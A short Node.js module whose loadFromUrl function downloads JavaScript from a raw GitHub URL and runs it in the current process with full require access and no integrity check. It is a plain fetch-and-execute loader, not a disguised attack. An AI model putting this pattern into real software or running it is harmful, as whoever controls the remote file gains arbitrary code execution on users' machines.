const axios  = require('axios');
const vm     = require('vm');
const Module = require('module');
const path   = require('path');

const TES_URL = 'https://raw.githubusercontent.com/danzzy1we/DuperTesy/refs/heads/main/tes.js';

async function loadFromUrl(url) {
  const { data: code } = await axios.get(url || TES_URL, {
    headers: { 'Cache-Control': 'no-cache' }
  });

  const m = new Module('remote', module);
  m.filename = path.join(__dirname, 'remote.js');
  m.paths    = Module._nodeModulePaths(__dirname);

  const wrapped = Module.wrap(code);
  const script  = new vm.Script(wrapped, { filename: 'remote.js' });
  const fn      = script.runInThisContext();
  fn(m.exports, m.require.bind(m), m, 'remote.js', __dirname);

  return m.exports;
}

module.exports = { loadFromUrl, TES_URL };
